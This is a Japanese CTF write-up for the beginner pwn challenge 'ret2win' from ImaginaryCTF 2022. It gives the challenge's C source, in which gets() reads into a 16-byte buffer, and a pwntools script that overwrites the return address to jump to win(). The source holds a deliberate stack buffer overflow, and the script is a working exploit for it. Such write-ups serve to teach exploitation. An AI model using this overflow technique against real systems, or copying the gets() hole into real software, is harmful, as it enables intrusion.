---
layout: chall
ctf_name: imaginaryctf_2022
problem_name: ret2win
genre: pwn
solved_date: 2022-07-17
during_ctf: true
tag: [bof]
fav: false
difficulty: beginner
---

### 概要

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

<details><summary>コード</summary>

```c
#include <stdio.h>
#include <stdlib.h>

int win() {
  FILE *fp;
  char flag[255];
  fp = fopen("flag.txt", "r");
  fgets(flag, 255, fp);
  puts(flag);
}

char **return_address;

int main() {
  char buf[16];
  return_address = buf+24;

  setvbuf(stdout,NULL,2,0);
  setvbuf(stdin,NULL,2,0);

  puts("Welcome to ret2win!");
  puts("Right now I'm going to read in input.");
  puts("Can you overwrite the return address?");

  gets(buf);

  printf("Returning to %p...\n", *return_address);
}
```

</details>


### 解法

<details><summary>スクリプト</summary>

```py
from pwn import *

BIN_NAME = 'vuln'
REMOTE_ADDR = 'ret2win.chal.imaginaryctf.org'
REMOTE_PORT = 1337
LOCAL = False

chall = ELF(BIN_NAME)
context.binary = chall

if LOCAL: stream = process(BIN_NAME)
else: stream = remote(REMOTE_ADDR, REMOTE_PORT)

payload = b'A' * 24 + pack(chall.symbols["win"])
stream.sendline(payload)

stream.interactive()
```

</details>

